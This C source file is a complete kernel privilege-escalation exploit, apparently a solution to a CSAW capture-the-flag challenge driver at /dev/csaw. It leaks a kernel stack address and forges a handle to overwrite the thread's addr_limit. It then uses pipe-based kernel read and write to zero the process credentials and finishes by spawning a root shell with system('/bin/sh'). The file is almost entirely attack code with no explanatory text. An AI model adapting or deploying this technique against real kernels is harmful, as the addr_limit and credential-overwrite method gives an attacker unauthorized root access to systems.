/*root@w0lfzhang666:/disk2/linux-3.13.1# uname -r
3.13.0-119-generic
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>

#define BUF_SIZE 0x100

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_HANDLE   CSAW_IOCTL_BASE+1
#define CSAW_READ_HANDLE    CSAW_IOCTL_BASE+2
#define CSAW_WRITE_HANDLE   CSAW_IOCTL_BASE+3
#define CSAW_GET_CONSUMER   CSAW_IOCTL_BASE+4
#define CSAW_SET_CONSUMER   CSAW_IOCTL_BASE+5
#define CSAW_FREE_HANDLE    CSAW_IOCTL_BASE+6
#define CSAW_GET_STATS      CSAW_IOCTL_BASE+7

#define KSTACKBASE 0xffff880000000000
#define KSTACKTOP 0xffff8800c0000000
#define KERNELBASE 0xffff880000000000

struct alloc_args {
    unsigned long size;
    unsigned long handle;
};

struct free_args {
    unsigned long handle;
};

struct read_args {
    unsigned long handle;
    unsigned long size;
    void *out;
};

struct write_args {
    unsigned long handle;
    unsigned long size;
    void *in;
};

struct consumer_args {
    unsigned long handle;
    unsigned long pid;
    unsigned char offset;
};

struct csaw_stats {
    unsigned long clients;
    unsigned long handles;
    unsigned long bytes_read;
    unsigned long bytes_written;
    char version[136];
};

int pipefd[2];

int is_kernel_pointer(void *ptr)
{
    unsigned long value = (unsigned long)ptr;
    return (KERNELBASE <= value);
}

int kmemcpy(void *dest, void *src, size_t size)
{
    //puts("write to pipe...");
    while( write(pipefd[1], src, size) == -1);
    //puts("read from pipe...");
    read(pipefd[0], dest, size);
    return size;
}

int main()
{
    int fd;
    int ret;
    unsigned long handle, buf, seed, target, new_handle;
    struct csaw_stats csaw_stats;
    struct alloc_args alloc_args;
    struct write_args write_args;
    struct consumer_args consumer_args;
    
    fd = open("/dev/csaw", O_RDONLY);
    if ( fd < 0 )
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
	
	memset(&csaw_stats, 0, sizeof(csaw_stats));

    puts("[*] leaking kernel stack address......\n");
    ret = ioctl(fd, CSAW_GET_STATS, &csaw_stats);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    unsigned long *stack_addr = (unsigned long *)&csaw_stats.version[16];
    printf("[+] Leaked stack address: %016lx\n", *stack_addr);
	
    void *kstack_base = (void *)(*stack_addr & ~0x1fff);
    printf("[+] kernel stack base address: %p\n", kstack_base);

    //puts("[*] overwriting thread_info->addr_limit......(taking several steps)\n");
    void *addr_limit = kstack_base + sizeof(void *) * 2 + sizeof(int) * 4;

    puts("[*] allocating a handle.....\n");
    memset(&alloc_args, 0, sizeof(alloc_args));
    alloc_args.size = BUF_SIZE;

    ret = ioctl(fd, CSAW_ALLOC_HANDLE, &alloc_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    handle = alloc_args.handle;
    printf("[+] Acquired handle: %lx\n", handle);

    puts("[*] Leaking buf's address......\n");
    memset(&consumer_args, 0, sizeof(consumer_args));
    consumer_args.handle = handle;
    consumer_args.offset = 255;

    ret = ioctl(fd, CSAW_GET_CONSUMER, &consumer_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    buf = consumer_args.pid;
    printf("[+] buf = %p\n", (void *)buf);

    seed = buf ^ handle;
    printf("[+] seed = %lx\n", seed);

    target = (unsigned long)addr_limit;
    printf("[+] target(addr_limit) = %lx\n", target);
    new_handle = target ^ seed;
    printf("[+] new handle = %lx\n", new_handle);

    puts("[*] overwriting buf as addr_limit's address......");
    memset(&consumer_args, 0, sizeof(consumer_args));
    consumer_args.handle = handle;
    consumer_args.offset = 255;
    consumer_args.pid = target;

    ret = ioctl(fd, CSAW_SET_CONSUMER, &consumer_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    puts("[*] overwriting addr_limit as 0xffffffffffffffff......");
    buf = (unsigned long)-1;
    memset(&write_args, 0, sizeof(write_args));
    write_args.handle = new_handle;
    write_args.size = sizeof(buf);
    write_args.in = &buf;

    ret = ioctl(fd, CSAW_WRITE_HANDLE, &write_args);
    if ( ret < 0 )
    {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }

    close(fd);

    puts("[*] Creating a pipe to read task_struct's data.....");
    ret = pipe(pipefd);
    if( ret < 0 )
    {
        perror("pipe failed!");
        exit(0);
    }

    void *task_struct;
    kmemcpy(&task_struct, kstack_base, sizeof(void *));
    printf("[+] task_struct: %p\n", task_struct);

    void *real_cred, *cred;
    unsigned int uid;

    puts("[*] Seeking task_struct->real_cred......");
    printf("[+] uid: %d\n", getuid());
    /*while( 1 )
    {
        task_struct += sizeof(void *);
        kmemcpy(&real_cred, task_struct, sizeof(void *));
        if( !is_kernel_pointer(real_cred) )
        {
            printf("[+] %p -> %p\n", task_struct, real_cred);
            continue;
        }

       //printf("here stop?\n");
        kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
        printf("[+] %p -> %p -> %u\n", task_struct, real_cred, uid);

        if( getuid() == uid )
        {
            printf("[+] Got real_cred's addree\n");
            cred = task_struct + sizeof(void *);
            break;
        }
    }*/
    
    unsigned long offset = 0xffff88007a74b478 - 0xffff88007a74afe0;
    real_cred = task_struct + offset;
    printf("[+] task_struct->real_cred's address: %p\n", real_cred);
    cred = real_cred + sizeof(void *);
    printf("[+] task_struct->cred's address): %p\n", cred );
    //now real_cred is pointing to the struct
    kmemcpy(&real_cred, real_cred, sizeof(void *));
    kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
    if( getuid() == uid )
    {
        puts("^^^^^^fucking the world! finally got it!^^^^^^\n");
    }
    
    puts("[*] Starting overwriting real_cred and cred....");
    unsigned int zeroarray[8];
    memset(zeroarray, 0, 32);
    kmemcpy(real_cred + 4, zeroarray, sizeof(zeroarray));

    kmemcpy(&uid, real_cred + sizeof(unsigned int), sizeof(unsigned int));
    printf("[+] task_struct->real_cred->uid: %d\n", uid);

    puts("[*] overwriting task_struct->cred to the same address as real_cred");
    kmemcpy(cred, &real_cred, sizeof(void *));

    kmemcpy(&cred, cred, sizeof(void *));

    printf("[+] task_struct->cred = %p\n", cred);

    close(pipefd[0]);
    close(pipefd[1]);

    printf("[+] getuid() = %d\n", getuid());
    system("/bin/sh");

    return 0;
}
